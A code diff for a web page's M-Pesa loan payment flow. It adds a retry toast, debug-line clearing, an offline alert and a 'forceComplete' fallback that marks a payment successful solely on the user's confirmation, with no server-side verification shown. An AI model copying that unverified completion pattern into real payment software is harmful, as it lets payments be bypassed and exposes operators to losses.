-            // Restart polling for another full round
+            showToast("Still pending. Trying again...");
             document.getElementById('pending-anim').classList.add('hide');
             document.getElementById('verify-anim').classList.remove('hide');
             document.getElementById('verify-subtitle').innerText = "Re-checking with M-Pesa...";
             startPolling(currentTxnId);
         }
 
+        // MANUAL FALLBACK: force complete if webhook is broken
+        function forceComplete() {
+            const confirm = window.confirm(
+                '⚠️ USE ONLY IF YOU HAVE PAID\n\n' +
+                'Transaction ID: ' + (currentTxnId || 'none') + '\n\n' +
+                'This will mark your loan as completed. Only tap OK if you have ACTUALLY been charged on M-Pesa.\n\n' +
+                'If you have NOT been charged, tap Cancel.'
+            );
+            if (!confirm) return;
+            log('User forced completion');
+            showSuccess();
+        }
+
         function retryPayment() {
             stopPolling();
             isProcessingPayment = false;
             currentTxnId = null;
+            debugLines = [];
             showScreen('screen-payment');
             resetPayButton();
         }
 
-        if (!navigator.onLine) document.getElementById('offline-gate').classList.remove('hide');
+        if (!navigator.onLine) {
+            alert('No internet connection detected.');
+        }
     </script>
 </body>
 </html>
